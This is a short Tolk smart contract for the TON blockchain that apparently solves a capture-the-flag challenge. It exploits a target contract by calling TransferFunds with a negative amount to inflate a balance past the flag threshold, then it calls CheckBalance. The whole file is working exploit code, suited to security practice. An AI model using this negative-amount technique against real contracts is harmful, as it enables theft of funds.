import "interface.tolk";

tolk 1.1

struct (0xDEADBEEF) Run {
    target: address
    admin: address
}

fun run(target: address, admin: address) {
    val msg1 = createMessage({
        dest: target,
        value: (TON_TO_NANO / 100) as coins,
        bounce: false,
        body: CreateAccount{}.toCell()
    });
    msg1.send(1);

    val msg2 = createMessage({
        dest: target,
        value: (TON_TO_NANO / 100) as coins,
        bounce: false,
        body: TransferFunds{
            recipient: admin,
            amount: -(BALANCE_FOR_FLAG as int256)
        }.toCell()
    });
    msg2.send(1);

    val msg3 = createMessage({
        dest: target,
        value: (TON_TO_NANO / 100) as coins,
        bounce: false,
        body: CheckBalance{}.toCell()
    });
    msg3.send(1);
}

fun onInternalMessage(in: InMessage) {
    val msg = lazy Run.fromSlice(in.body);
    match (msg) {
        Run => {
            run(msg.target, msg.admin);
        }
        else => {
            assert (in.body.isEmpty()) throw ERROR_CODES.ERROR_WRONG_OPCODE;
        }
    }
}

fun onBounceMessage(in: InMessageBounced) {}
